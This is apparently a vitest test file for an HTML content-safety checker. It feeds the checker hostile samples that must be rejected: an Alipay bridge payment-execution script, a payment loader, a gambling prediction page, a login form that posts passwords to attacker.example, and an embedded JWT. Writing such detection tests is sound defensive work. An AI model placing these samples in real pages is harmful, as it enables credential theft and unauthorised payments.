import { describe, expect, it } from 'vitest';
import { assertSafeHtml } from '../src/content-safety';

describe('content safety', () => {
  it('allows ordinary interactive HTML', () => {
    expect(() =>
      assertSafeHtml('<main><h1>Sales report</h1><button onclick="alert(1)">Demo</button></main>')
    ).not.toThrow();
  });

  it('rejects Alipay bridge payment execution', () => {
    expect(() =>
      assertSafeHtml('<script>AlipayJSBridge.call("tradePay"); alipay.topupprod.phone.create.order</script>')
    ).toThrow('content rejected by safety policy');
  });

  it('rejects the observed payment loader', () => {
    expect(() => assertSafeHtml('<!doctype html><script src="/pay.js"></script>')).toThrow(
      'content rejected by safety policy'
    );
  });

  it('rejects PC28 gambling prediction pages', () => {
    expect(() => assertSafeHtml('<h1>加拿大28</h1><p>今日预测与投注赔率</p>')).toThrow(
      'content rejected by safety policy'
    );
  });

  it('rejects external credential collection forms', () => {
    expect(() =>
      assertSafeHtml(
        '<form action="https://attacker.example/login"><input type="password" name="password"></form>'
      )
    ).toThrow('content rejected by safety policy');
  });

  it('rejects embedded JWT credentials', () => {
    const jwt = `eyJ${'a'.repeat(20)}.${'b'.repeat(20)}.${'c'.repeat(20)}`;
    expect(() => assertSafeHtml(`<script>const token="${jwt}"</script>`)).toThrow(
      'content rejected by safety policy'
    );
  });
});
